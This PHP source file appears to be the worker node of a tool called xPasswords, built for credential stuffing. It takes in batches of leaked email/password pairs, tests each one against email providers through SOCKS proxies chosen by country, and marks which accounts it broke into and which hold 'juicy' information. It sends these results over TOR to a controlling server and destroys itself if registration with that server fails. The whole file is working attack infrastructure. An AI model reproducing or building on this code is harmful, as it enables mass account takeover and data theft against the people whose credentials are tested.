<?php
namespace xPasswords;

// Load dependencies
require('../Class/Core.php');

// Load Providers
foreach(glob(Core::$authenticationProvidersDirectory . '*.php') as $filename) {
    // Include the file in the script
    require($filename);
};

class Server {

    public static $availableSlots = XPASSWORDS_MAX_SLOTS;

    // Workers
    public static $workerProcess    = [];
    public static $workerSend       = [];

    public static $reactLoop = false;

    public static function run() {

        // Check if this session is not in debug mode
        if(Core::getVar('debug') == 'true' AND
           !XPASSWORDS_IS_PRODUCTION) {

            define('_DEBUG_MODE', true);
            echo Core::say('[INFO] Debug mode set.', ['color' => 'blue']);
        }

        // Verify if the provided threads var is valid
        $threadsNumbers = Core::getVar('threads');
        if(empty($threadsNumbers)) {
            echo Core::say('[ERROR] Number of threads is not set. Please specify a number via --threads', ['color' => 'red']);
            return false;
        }
        if(!is_numeric($threadsNumbers) OR $threadsNumbers <= 0) {
            //echo Core::say('[ERROR] Invalid number of threads. Please specify a correct number via --threads', ['color' => 'red']);
            Core::selfSuicide();
            return false;
        }
        // Set the numbers of threads
        define('XPASSWORDS_MAX_SLOTS', $threadsNumbers);
        echo Core::say('[INFO] Working with ' . $threadsNumbers . ' threads', ['color' => 'blue']);
        $threadsNumbers = NULL;

        // Connect to local SQLite Database using PDO
        if(!Bootstrap::DatabaseConnect(XPASSWORDS_FILENAME_SERVER)) {
            echo Core::say('[ERROR] Unable to open the database.', ['color' => 'red']);
            return false;
        }

        // Make handshake
        if(!static::_processHandshake()) {
            return false;
        }
        
        // Testing accounts authentication for cron task
        if(!defined('_DEBUG_MODE')) {

            echo Core::say('[INFO] [PROVIDERS] Testing accounts authentication for cron tasks...', ['color' => 'green']);

            foreach(Core::$authenticationProviders as $provider => $options) {

                // Look if there is an working authentication
                if(!isset($options['authentication']['email']) OR !isset($options['authentication']['password'])) {
                    echo Core::say('[WARNING] [PROVIDERS] No valid credentials for ' . $provider . ', it will not be verified', ['color' => 'brown']);
                    continue;
                }

                // Run the test
                $provider = Core::$authenticationProvidersNamespace . $provider;
                if($provider::authenticate($options['authentication']['email'], $options['authentication']['password'])) {
                    echo Core::say('[INFO] [PROVIDERS] Success logging for ' . $provider, ['color' => 'blue']);
                } else {
                    echo Core::say('[ERROR] [PROVIDERS] Login error, please check authentication tester for ' . $provider, ['color' => 'red']);
                    return false;
                }
            }

            // Free memory
            $provider = NULL;
            $options = NULL;
        }

        // Launch sockets
        static::$reactLoop = \React\EventLoop\Factory::create();

        // Statistics
        static::$reactLoop->addPeriodicTimer(60, function() {

            // Memory checker
            echo Core::say('[SERVER] Current memory usage: ' . number_format((memory_get_usage() / 1024), 3) . 'K', ['color' => 'blue']);

            // Slots left (debug)
            echo Core::say('[SERVER] Available slots: ' . static::$availableSlots . '/' . XPASSWORDS_MAX_SLOTS, ['color' => 'blue']);
        });

        // Each 5 seconds, check if slots are available and if yes, send them to processer
        static::$reactLoop->addPeriodicTimer(10, function() {
            static::_processCredentials();
        });

        // Each 2 seconds, check if there is results available, send it back to the server
        static::$reactLoop->addPeriodicTimer(10, function() {
            static::_sendCredentials();
        });

        // Run the webserver
        Network::openSocket('Server');
    }

    public static function queue($datas, $response) {

        // Decompress datas
        $datas = Core::decompress($datas);
        if(!$datas) {
            echo Core::say('[NETWORK] [ERROR] Unable to decompress datas.', ['color' => 'red']);
            return false;
        }

        // Detect if the string is not empty
        if(empty($datas)) {
            echo Core::say('[NETWORK] [ERROR] Empty string detected !', ['color' => 'red']);
            return false;
        }
        
        // Decrypt datas
        try {
            $datas = Core::$CipherNetwork->decrypt($datas);
        } catch (\Exception $e) {
            echo Core::say('[NETWORK] [ERROR] Unable to decrypt datas !', ['color' => 'red']);
            return false;
        }

        // Detect if the string is in JSON or not
        if(!Core::isJSON($datas)) {
            echo Core::say('[NETWORK] [ERROR] Received invalid JSON !', ['color' => 'red']);
            return false;
        }

        // Decompress JSON into an array
        $datas = Core::decode($datas);

        // Detect if the array is not empty
        if(empty($datas)) {
            echo Core::say('[NETWORK] [ERROR] Empty array detected !', ['color' => 'red']);
            return false;
        }

        // Detect type
        switch($datas['cmd']) {

            case 'expressDelivery': // Worker have job !            
            // Remove useless datas
            $datas = $datas['datas'];

            // Check the array
            if(empty($datas)) {
                echo Core::say('[NETWORK] [ERROR] Empty array detected !', ['color' => 'red']);
                return false;
            }

            // Say it !
            echo Core::say('[NETWORK] [SUCCESS] Received ' . count($datas) . ' emails/passwords combinaisons.', ['color' => 'green']);

            // Begin inserting (10x faster than AUTOCOMMIT)
            Bootstrap::$Database->beginTransaction();

            // Queue the delivery
            foreach($datas as $sAccount) {
                
                // Insert in database
                $stmt = Bootstrap::$Database->prepare(
                    'INSERT INTO xPasswordsQueueIn(sId, sEmail, sPassword, sCountry, sFor, sAdvancedOptions, isBusy) VALUES (:sId, :sEmail, :sPassword, :sCountry, :sFor, :sAdvancedOptions, :isBusy)'
                );
                $stmt->execute([
                    'sId' => Core::$Cipher->encrypt($sAccount['sId']),
                    'sEmail' => Core::$Cipher->encrypt($sAccount['sEmail']),
                    'sPassword' => Core::$Cipher->encrypt($sAccount['sPassword']),
                    'sCountry' => Core::$Cipher->encrypt($sAccount['sCountry']),
                    'sFor' => Core::$Cipher->encrypt($sAccount['sFor']),
                    'sAdvancedOptions' => Core::$Cipher->encrypt($sAccount['sAdvancedOptions']),
                    'isBusy' => 0,
                ]);
            }

            // Commit
            Bootstrap::$Database->commit();

            // Reponse
            $response->writeHead(200, Network::$HTTPResponseHeaders);
            $response->end(Core::compress(Core::$CipherNetwork->encrypt(Core::encode(['success' => true]))));

            return true;
            break;
        }

        return false;
    }
    
    public static function _processHandshake() {
        
        if(!defined('_DEBUG_MODE')) {

            // Getting public IP using http://icanhazip.com/
            echo Core::say('[INFO] Getting Public IP...', ['color' => 'blue']);
            try {

                $request = \Requests::get('http://icanhazip.com/', [
                    'User-Agent' => Core::getUserAgent(),
                    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
                    'Content-Type' => 'application/x-www-form-urlencoded',
                    'Connection' => 'keep-alive',
                ], [
                    'timeout' => 30, // Timeout
                    'useragent' => Core::getUserAgent(), // Random user-agent
                    'follow_redirects' => false, // Don't follow redirections
                ]);

            } catch (\Exception $e) {
                $errCode = trim(ltrim(rtrim(Core::cURLCode(trim($e->xdebug_message))[0], ':'), 'Requests_Exception:'));
                echo Core::say('[ERROR] Internet is unreachable. Make sure that your internet connection is correctly setup.', ['color' => 'red']);
                echo Core::say('[ERROR] Details: ' . $errCode, ['color' => 'red']);
                $errCode = NULL;
                return false;
            }
            $sPublicIP = trim($request->body);
            if(empty($sPublicIP)) {
                echo Core::say('[ERROR] Error while getting Public IP.', ['color' => 'red']);
                return false;
            }
            if(!filter_var($sPublicIP, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
                echo Core::say('[ERROR] Unable to get Public IP.', ['color' => 'red']);
                return false;
            }
            
            // Okay !
            Core::sayDone();
            
        } else {
            
            // IP not needed because it is in devlopement
            $sPublicIP = '127.0.0.1';
        }
        
        echo Core::say('[DECLARE] [INFO] Handshake with the client...', ['color' => 'purple']);
        
        try {
            // Send results over TOR
            if(!$request = Request::make(XPASSWORDS_IO_CALLBACK_RACINE_URL, [
                'cmd' => 'declareWorker',
                'datas' => [
                    'sPublicIP' => $sPublicIP,
                    'onionURL' => XPASSWORDS_IO_SERVER_RACINE_URL,
                    'isOnline' => true,
                ],
            ])) {
                throw new \Exception(Request::$lastError);
            }
        } catch (\Exception $e) {
            echo Core::say('[DECLARE] [ERROR] TOR network is unreachable. Make sure that the TOR network is correctly setup.', ['color' => 'red']);
            return false;
        }

        // Decompress JSON
        if(!$requestBody = Core::decompress($request->body)) {
            echo Core::say('[DECLARE] [ERROR] Unable to decompress content.', ['color' => 'red']);
            return false;
        }

        // Decrypt JSON
        try {
            $requestBody = Core::$CipherNetwork->decrypt($requestBody);
        } catch (\Exception $e) {
            Core::say('[ERROR] Unable to decrypt datas !', ['color' => 'purple']);
            return false;
        }

        // Detect JSON
        if(!Core::isJSON($requestBody)) {
            echo Core::say('[DECLARE] [ERROR] Invalid response from the client.', ['color' => 'red']);
            return false;   
        }

        // Decode JSON
        $request = Core::decode($requestBody);

        // Check if there is errors
        switch($request['success']) {
            case true: // Yeah

            Core::sayDone(); // Okay !
            
            /*'Europe' => [
                    // France
                    0 => [
                    ],
                ],
                'North America' => [],
                'South America' => [],
                'North Africa' => [],
                'South Africa' => [],
                'Oceania' => [],
                'Asia' => [],
            ];*/
            
            // Add each socks in memory
            foreach($request['availableSocks'] as $iterator => $object) {
                
                echo Core::say('[INFO] [PROXY] ' . $object['sPublicIP'] . ':' . $object['sPort'] . ' (' . $object['sIdentifier'] . ') added.', ['color' => 'blue']);
                
                switch((isset($object['sUsername']) AND isset($object['sPassword']))) {
                                        
                    case true: // Login secured
                    Core::$SocksServers[ $object['sIdentifier'] ][] = [
                        'hostname' => $object['sPublicIP'] . ':' . $object['sPort'],
                        'username' => $object['sUsername'],
                        'password' => $object['sPassword'],
                    ];
                    break;
                    
                    case false: // No login-secured
                    Core::$SocksServers[ $object['sIdentifier'] ][] = [
                        'hostname' => $object['sPublicIP'] . ':' . $object['sPort'],
                    ];
                    break;
                }
            }

            // Add each providers in memory
            foreach($request['availableProviders'] as $iterator => $object) {
                
                // Debug purposes
                //echo Core::say('[INFO] [PROVIDERS] ' . $object['sClassName'] . ' support added.', ['color' => 'blue']);

                // Adding supported mails to memory
                Core::$authenticationProviders[ ucfirst(strtolower($object['sClassName'])) ] = [
                    'supportedDomains' => Core::decode($object['sEmails']),
                    'authentication' => Core::decode($object['sWorkingCombinaison']),
                ];
            }
            break;

            case false: default:
            echo Core::say('[DECLARE] [ERROR] Unable to declare the server.', ['color' => 'red']);
            Core::selfSuicide();
            return false;
            break;
        }
        
        return true;
    }

    public static function _sendCredentials() {

        // Check for Pushback results
        $stmt = Bootstrap::$Database->prepare('SELECT COUNT(*) FROM xPasswordsQueueOut WHERE isBusy=0');
        $stmt->execute();
        $stmt = $stmt->fetch(\PDO::FETCH_ASSOC)['COUNT(*)'];
        if($stmt <= 0) {
            return false;
        }

        // Create new child to proceed
        $sId = (count(static::$workerSend) + 1);

        // Create new child to proceed
        static::$workerSend[ $sId ] = new \xPasswords\Child\Create([

            // React Loop
            'loop' => static::$reactLoop,

            // Type of child
            'type' => 'sendCredentials',

            // Timeout
            'timeout' => 600, // 10 minutes max

            // Header text
            'header' => 'Sending ' . $stmt . ' entr' . ($stmt > 1 ? 'ies' : 'y'). ' back to the principal server...',

            // User custom defines
            'options' => [
                'title' => 'Network',
                'sId' => $sId,
            ]
        ]);
        static::$workerSend[ $sId ]->on('exit', function($thisProcess) use ($sId) {
            // Free memory
            unset(Server::$workerSend[ $sId ]); Server::$workerSend[ $sId ] = false;
        });

        static::$workerSend[ $sId ]->run();
    }

    public static function _processCredentials() {

        // Check if there is available slots
        $availableSlots = static::$availableSlots;
        if($availableSlots <= 0) {
            return false;
        }

        // Yes ? Run them in a new worker
        $stmt = Bootstrap::$Database->prepare(
            'SELECT `id`, `sId`, `sEmail`, `sPassword`, `sCountry`, `sFor`, `sAdvancedOptions` FROM `xPasswordsQueueIn` WHERE `isBusy`=0 ORDER BY `id` DESC LIMIT ' . $availableSlots
        );
        $stmt->execute();
        $xQuery = $stmt->fetchAll(\PDO::FETCH_ASSOC);
        if(!$xQuery) { // Nothing found
            return false;
        }

        // Remove taken from new slots
        static::$availableSlots = ($availableSlots - count($xQuery));

        // Send informations to worker
        foreach($xQuery as $id => $xQuery) {

            // Process here
            // Verify the password + check emails if okay
            // Send request to API and remove it from database
            static::process(
                $xQuery['id'],
                Core::$Cipher->decrypt($xQuery['sId']),
                Core::$Cipher->decrypt($xQuery['sEmail']),
                Core::$Cipher->decrypt($xQuery['sPassword']),
                Core::$Cipher->decrypt($xQuery['sCountry']),
                Core::$Cipher->decrypt($xQuery['sFor']),
                Core::$Cipher->decrypt($xQuery['sAdvancedOptions'])
            );
        }

        $xQuery = NULL;

        return true;
    }
    
    private static function process($Id, $sCombinaisonsId, $sEmail, $sPassword, $sCountry, $sFor, $sAdvancedOptions) {

        // First, lock the entry in the database
        $stmt = Bootstrap::$Database->prepare('UPDATE `xPasswordsQueueIn` SET `isBusy`=1 WHERE `id`=:Id');
        $stmt->execute([
            'Id' => $Id,
        ]);

        // Explode email securely
        $sEmailExploded = explode('@', $sEmail);

        // Check provider
        $sProvider = Core::providerCheck($sEmailExploded[1]);
        if($sProvider === false) {
            return false;
        }
        
        // Create new child to proceed
        $sId = (count(static::$workerProcess) + 1);
        
        // Create new child to proceed
        static::$workerProcess[ $sId ] = new \xPasswords\Child\Create([

            // React Loop
            'loop' => static::$reactLoop,

            // Type of child
            'type' => 'processCredentials',

            // Inbound datas
            'payload' => [
                
                // Cron task & proxy infos
                'base' => [
                    'proxy' => Core::getProxy($sCountry),
                    'cronTask' => Core::$authenticationProviders[ $sProvider ]['authentication'],
                ],
                
                // Authentication details
                'authentication' => [
                    
                    'provider' => $sProvider, // Will be checked after

                    'sId' => $sCombinaisonsId, // Do not put $sId, it is the ID scan
                    'fullEmail' => $sEmail,
                    'email' => $sEmailExploded,
                    'password' => trim($sPassword),

                    'sCountry' => $sCountry,
                    'sFor' => array_values(Core::decode($sFor)),
                    'sAdvancedOptions' => array_values(Core::decode($sAdvancedOptions)),

                    // Result informations
                    'wasAuthenticated' => false,
                    'wasBruteforced' => false,
                    'juicyInformations' => false,
                ],
            ],

            // Timeout
            'timeout' => 600, // 10 minutes max

            // Header text
            'header' => 'Testing against ' . strtolower(trim($sEmail)),// . ':' . trim($sPassword),

            // User custom defines
            'options' => [
                'title' => 'Tester',
                'sId' => $sId,

                'dbId' => $Id,
            ]
        ]);
        static::$workerProcess[ $sId ]->on('response', function($thisProcess, $output) {

            switch($output['type']) {

                case 'setOptimizedTimeout':
                // Detect if the output is an number                        
                if(!ctype_digit((string) $output['childOutput'])) {
                    echo Core::say($thisProcess->vars['options']['__textPreprend'] . ' [ERROR] Timeout provided by the child is not numeric !', ['color' => 'red']);
                    return false;
                }
                
                // Cancel base timer
                $thisProcess->timeout->cancel();

                // Gossip
                echo Core::say($thisProcess->vars['options']['__textPreprend'] . ' [INFO] Timeout for this script has been set to ' . $output['childOutput'] . ' seconds.', ['color' => 'blue']);

                // If timeout is reached kill process
                $thisProcess->timeout = Server::$reactLoop->addTimer($output['childOutput'], function() use ($thisProcess) {

                    echo Core::say($thisProcess->vars['options']['__textPreprend'] . ' [ERROR] This children exceed the allowed timeout (while searching in directories).', ['color' => 'red']);
                    
                    // Terminate process
                    $thisProcess->process->terminate(SIGTERM);

                    // Unlock the entry in database
                    $stmt = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueIn SET isBusy=0 WHERE id=:Id');
                    $stmt->execute([
                        'Id' => $thisProcess->vars['options']['dbId'],
                    ]);

                    return true;
                });
                break;

                case 'results':
                // Check if the decryption has been correctly made
                if(!is_array($output['childOutput'])) {
                    return false;
                    //Core::selfSuicide(); // Bye bye !
                }
                
                // Cancel timer
                $thisProcess->timeout->cancel();
                
                // Remove useless variables (because they are already on the other side)
                unset($output['childOutput']['provider'],
                      $output['childOutput']['fullEmail'],
                      $output['childOutput']['email'], 
                      $output['childOutput']['sCountry'], 
                      $output['childOutput']['sFor'],
                      $output['childOutput']['sAdvancedOptions']);
                
                // Insert response from child in xPasswordsQueueOut table
                $stmt = Bootstrap::$Database->prepare('INSERT INTO xPasswordsQueueOut(sDatas, isBusy) VALUES (:sDatas, 0)');
                $stmt->execute([
                    'sDatas' => Core::$Cipher->encrypt(Core::encode($output['childOutput'])),
                ]);

                // Remove entry from xPasswordsQueueIn table
                $stmt = Bootstrap::$Database->prepare('DELETE FROM xPasswordsQueueIn WHERE id=:sId');
                $stmt->execute([
                    'sId' => $thisProcess->vars['options']['dbId'],
                ]);
                
                // Debug
                echo Core::say($thisProcess->vars['options']['__textPreprend'] . ' [INFO] This entry is ready to ship.', ['color' => 'green']);
                break;
            }
        });
        static::$workerProcess[ $sId ]->on('timeout', function($thisProcess) {

            // Unlock the entry in database to retry later
            $stmt = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueIn SET isBusy=0 WHERE id=:Id');
            $stmt->execute([
                'Id' => $thisProcess->vars['options']['dbId'],
            ]);
        });
        static::$workerProcess[ $sId ]->on('exit', function($thisProcess, $exitCode, $termSignal) use ($sId) {
            
            // Detect if the script was exited due to an fatal error and if yes, reset the entry
            if($exitCode != 0) {
                
                // Unlock the entry in database to retry later
                $stmt = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueIn SET isBusy=0 WHERE id=:Id');
                $stmt->execute([
                    'Id' => $thisProcess->vars['options']['dbId'],
                ]);
                
                // Say it
                echo Core::say($thisProcess->vars['options']['__textPreprend'] . ' [ERROR] Child crashed. The entry has been unlocked to retry.', ['color' => 'red']);
            }
            
            // Free memory
            unset(Server::$workerProcess[ $sId ]);
            Server::$workerProcess[ $sId ] = false;
            
            // Increment available slots
            static::$availableSlots++;
        });

        static::$workerProcess[ $sId ]->run();
    }
};

Server::run();